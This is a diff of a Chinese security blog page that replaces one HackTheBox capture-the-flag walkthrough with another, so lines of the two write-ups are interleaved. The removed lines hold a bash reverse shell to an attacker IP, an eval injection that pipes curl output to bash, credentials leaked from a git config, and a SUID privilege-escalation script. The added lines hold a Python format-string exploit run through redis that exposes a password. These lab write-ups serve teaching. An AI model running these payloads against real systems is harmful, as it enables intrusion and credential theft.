-                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url<span class="token punctuation">,</span> code<span class="token operator">=</span><span class="token number">302</span><span class="token punctuation">)</span>
-            <span class="token keyword">else</span><span class="token punctuation">:</span>
-                <span class="token keyword">return</span> url
+        license_key_decrypted <span class="token operator">=</span> f<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>args<span class="token punctuation">.</span>check<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key valid! Decrypted value:"</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------------------"</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>license_key_decrypted<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key invalid"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> options<span class="token operator">=</span>Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"Invalid engine!"</span><span class="token punctuation">)</span>
+<h2 id="五、python格式化字符串漏洞"><a href="#五、python格式化字符串漏洞" class="headerlink" title="五、python格式化字符串漏洞"></a>五、python格式化字符串漏洞</h2><p>python格式化字符串漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://podalirius.net/en/articles/python-format-string-vulnerabilities/">https://podalirius.net/en/articles/python-format-string-vulnerabilities/</a></p>
+<p>连接redis</p>
+<pre class="line-numbers language-none"><code class="language-none">redis-cli -s /run/redis/redis.sock<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
-        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> options<span class="token operator">=</span>Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"Something went wrong!"</span><span class="token punctuation">)</span>
+<p>然后执行如下命令，以明文形式获取口令</p>
+<pre class="line-numbers language-none"><code class="language-none">HMSET test first-name "{license.__init__.__globals__[secret_encoded]}" last-name test username test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行如下命令</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/license -p test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>接下来尝试反弹shell</p>
-<p>攻击机开启nc监听和http服务</p>
-<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9898
-python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927161244025.png"></p>
+<p>口令如下</p>
+<pre class="line-numbers language-none"><code class="language-none">unCR4ckaBL3Pa$$w0rd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>攻击机新建一个反弹shell文件<code>rev_shell.txt</code>，内容如下</p>
-<pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>Burp修改请求包query参数如下</p>
-<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('curl+10.10.14.7/rev_shell.txt|bash')",'&lt;String&gt;','exec'))%2b'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>发送请求包，成功反弹shell，获取svc用户权限</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410200356098.png"></p>
-<h2 id="四、Git信息泄露"><a href="#四、Git信息泄露" class="headerlink" title="四、Git信息泄露"></a>四、Git信息泄露</h2><p>查看当前目录下文件，看到有<code>.git</code>，尝试git-dump和Githack下载失败，只能硬看</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410202411535.png"></p>
-<p>看到<code>config</code>文件里有用户名密码</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410202439506.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">cody:jh1usoih2bkjaspwe92<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>PS：后面的<code>gitea.searcher.htb</code>是个子域，加进hosts文件看了一眼，是个类似git仓库的东西，有两个用户<code>cody</code>和<code>administrator</code>，估计也是一条路线，但没过多尝试</p>
-<h2 id="五、SUID提权"><a href="#五、SUID提权" class="headerlink" title="五、SUID提权"></a>五、SUID提权</h2><p>在svc用户尝试执行<code>sudo -l</code>，发现提示需要<code>-S</code>参数输入密码</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410203854475.png"></p>
-<p>执行<code>sudo -l -S</code>，尝试密码，是上面cody的密码（PS：在HackTheBox遇见好几次这种张冠李戴的事…）</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410203820884.png"></p>
-<p>可看到有一条命令可以以root身份执行，sudo执行该命令</p>
-<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/python3 /opt/scripts/system-checkup.py *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410204703295.png"></p>
-<p>提示三个用法，前两个是查看docker容器的相关信息，用处不大，第三个尝试会报错，如下</p>
-<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205015580.png"></p>
-<p>想看一下<code>/opt/scripts/system-checkup.py</code>，没权限，就用<code>find</code>命令模糊查找<code>full-checkup</code>，发现有<code>/opt/scripts/full-checkup.sh</code>，但svc用户没有可写权限没法更改，那就尝试在当前目录<code>/home/svc</code>新建一个同名文件</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411151914512.png"></p>
-<p>靶机shell环境不方便编辑文件，我们在攻击机创建<code>full-checkup.sh</code>，内容如下</p>
-<pre class="line-numbers language-none"><code class="language-none">#!/bin/bash
-chmod +s /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>然后在靶机用<code>wget</code>把<code>full-checkup.sh</code>传过来，并添加可执行权限（注意需在<code>/home/svc</code>目录下操作，别的目录无可写权限）</p>
-<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.7/full-checkup.sh
-chmod +x full-checkup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205810653.png"></p>
-<p>再次执行<code>full-checkup</code>选项，可看到<code>/bin/bash</code>已成功设置suid</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205833873.png"></p>
-<p>执行<code>bash -p</code>成功获取root权限</p>
-<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205918651.png"></p>
+<p>成功获取root权限</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927161336159.png"></p>
 <p>Over！</p>
-<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411181759774.png" style="zoom: 80%;">
-
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_58869808/article/details/130050438">https://blog.csdn.net/qq_58869808/article/details/130050438</a></p>
-
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927161500540.png" style="zoom: 67%;">
                 
             </div>
             <hr/>
@@ -685,7 +718,7 @@ chmod +x full-checkup.sh<span aria-hidden="true" class="line-numbers-rows"><span
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://wa0er.github.io/posts/d91931aa.html">https://wa0er.github.io/posts/d91931aa.html</a>
+                    <a href="https://wa0er.github.io/posts/ec5f74de.html">https://wa0er.github.io/posts/ec5f74de.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1232,23 +1265,23 @@ chmod +x full-checkup.sh<span aria-hidden="true" class="line-numbers-rows"><span
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/posts/7761233f.html">
+                <a href="/posts/3e4c0ff8.html">
                     <div class="card-image">
                         
-                        <img src="/medias/article_cover/Cerberus.png" class="responsive-img" alt="HTB-Cerberus">
+                        <img src="/medias/article_cover/Pilgrimage.png" class="responsive-img" alt="HTB-Pilgrimage">
                         
-                        <span class="card-title">HTB-Cerberus</span>
+                        <span class="card-title">HTB-Pilgrimage</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            HackTheBox-Cerberus
+                            HackTheBox-Pilgrimage
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-24
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-14
                         </span>
                         <span class="publish-author">
                             
@@ -1280,23 +1313,23 @@ chmod +x full-checkup.sh<span aria-hidden="true" class="line-numbers-rows"><span
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/9681db2a.html">
+                <a href="/posts/e48c1386.html">
                     <div class="card-image">
                         
-                        <img src="/medias/article_cover/Shoppy.png" class="responsive-img" alt="HTB-Shoppy">
+                        <img src="/medias/article_cover/Wifinetic.png" class="responsive-img" alt="HTB-Wifinetic">
                         
-                        <span class="card-title">HTB-Shoppy</span>
+                        <span class="card-title">HTB-Wifinetic</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            HackTheBox-Shoppy
+                            HackTheBox-Wifinetic
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-12
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-30
                             </span>
                         <span class="publish-author">
                             
